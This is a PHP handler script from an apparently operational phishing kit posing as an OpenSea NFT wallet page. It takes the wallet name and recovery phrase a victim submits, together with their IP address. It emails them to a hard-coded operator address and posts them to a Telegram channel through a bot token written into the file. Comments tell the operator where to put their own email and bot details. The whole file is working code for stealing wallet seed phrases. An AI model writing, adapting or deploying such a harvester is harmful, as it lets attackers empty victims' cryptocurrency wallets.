<?php
$telegram = "on"; // Make off TO DISABLE TELEGRAM RESULT
$user_ids = "illogs@yandex.com"; // your email here 
$chatId = "@nftsl_bot"; // YOUR CHANNEL CHATID
$botUrl = "bot1868134783:AAFO2HTVVBGF3AUS09PVj3hQFTEJCBAr06A"; // YOUR BOT TOKEN HERE
extract($_REQUEST);

# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)

$_SESSION['modal_wallet_name_input']   = $_POST['modal_wallet_name_input'];
$_SESSION['recovery_phrase']   = $_POST['recovery_phrase'];
$ip		= $_SERVER['REMOTE_ADDR'];

# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)

$data = "
+++++++++++🌐 CoDeX@OPENSEA.NFT WALLETS INFO 🌐+++++++++++
Wallet Name       = ".$_SESSION['modal_wallet_name_input']."

Recovery Phrase   = ".$_SESSION['recovery_phrase']."
+++++++++++🌐 CoDeX@OPENSEA.NFT WALLETS INFO 🌐+++++++++++

+++++++++++🌐 CoDeX@OPENSEA.NFT WALLETS IP INFOS 🌐+++++++++++
IP      = http://www.geoplugin.net/json.gp?ip=$ip
+++++++++++🌐 CoDeX@OPENSEA.NFT WALLETS IP INFOS 🌐+++++++++++
";

$msg = "
+++++++++++🌐 CoDeX@OPENSEA.NFT WALLETS INFO 🌐+++++++++++<br>
Wallet Name       = ".$_SESSION['modal_wallet_name_input']." <br><br>
Recovery Phrase   = ".$_SESSION['recovery_phrase']." <br>
+++++++++++🌐 CoDeX@OPENSEA.NFT WALLETS INFO 🌐+++++++++++
<br>
+++++++++++🌐 CoDeX@OPENSEA.NFT WALLETS IP INFOS 🌐+++++++++++<br>
IP      = http://www.geoplugin.net/json.gp?ip=$ip  <br>
+++++++++++🌐 CoDeX@OPENSEA.NFT WALLETS IP INFOS 🌐+++++++++++ <br>

";


// Email send function
$sender = 'From: 💎 C0DeX 💎 <result@codex.com>';
$sub="NEW OPENSEA.NFT WALLETS FROM [$ip]";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$result=mail($user_ids, $sub, $msg, $headers);

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}
